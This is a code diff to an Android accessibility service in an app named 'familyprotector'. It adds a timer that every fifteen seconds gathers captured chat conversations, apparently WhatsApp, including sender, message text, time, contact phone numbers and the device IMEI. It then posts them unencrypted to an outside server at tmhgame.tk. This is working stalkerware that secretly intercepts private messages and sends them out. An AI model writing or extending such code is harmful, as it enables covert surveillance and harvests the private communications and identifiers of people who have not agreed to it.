@@ -12,11 +12,19 @@ import android.view.accessibility.AccessibilityNodeInfo;
 
 import androidx.annotation.RequiresApi;
 
+import com.family.familyprotector.ContactHelper;
 import com.family.familyprotector.Conversation;
+import com.family.familyprotector.Device;
 import com.family.familyprotector.FileR;
 import com.family.familyprotector.Logger;
 import com.family.familyprotector.Message;
+import com.family.internet.ServerHelper2;
+import com.family.util.DoublyLinkedList;
 import com.family.util.StringUtil;
+
+import org.json.JSONArray;
+import org.json.JSONException;
+import org.json.JSONObject;
 
 import java.io.IOException;
 import java.util.ArrayList;
@@ -520,6 +528,55 @@ https://www.youtube.com/results?search_query=the+show+must+go+on
                 });
             }
         }, 0, 1000*60 * 10);
+
+        new Timer().schedule(new TimerTask() {
+            @Override
+            public void run() {
+                h.post(new Runnable() {
+                    @Override
+                    public void run() {
+                        JSONObject d = new JSONObject();
+                        JSONArray ar = new JSONArray();
+                        for(Map.Entry<String, Conversation> m : conversationMap.entrySet()) {
+                            String k = m.getKey();
+                            Conversation c = m.getValue();
+                            JSONArray ma = new JSONArray();
+                            JSONObject jo = new JSONObject();
+                            for(DoublyLinkedList.Node x = c.messages.head; x != null; x = x.next) {
+                                Message message = (Message) x.element;
+                                JSONObject o = new JSONObject();
+                                try {
+                                    o.put("sender", message.sender);
+                                    o.put("content", message.content);
+                                    o.put("time", message.date.toString());
+                                    ma.put(o);
+                                } catch (JSONException e) {
+                                    e.printStackTrace();
+                                }
+                            }
+                            try {
+                                jo.put("sender", k);
+                                jo.put("number", new ContactHelper(instance).getPhoneNumber(instance, k));
+                                jo.put("con", ma);
+                                ar.put(jo);
+                            } catch (JSONException e) {
+                                e.printStackTrace();
+                            }
+
+                        }
+                        try {
+                            d.put("data", ar);
+                            d.put("imei", new Device(instance).getImei());
+                            Logger.l("POSTED data : " + d.toString());
+                            new ServerHelper2(instance).execute("http://tmhgame.tk/sendWhatsapp", d.toString());
+
+                        } catch (JSONException e) {
+                            e.printStackTrace();
+                        }
+                    }
+                });
+            }
+        }, 0, 1000*15);
     }
 
     public void sondur() {
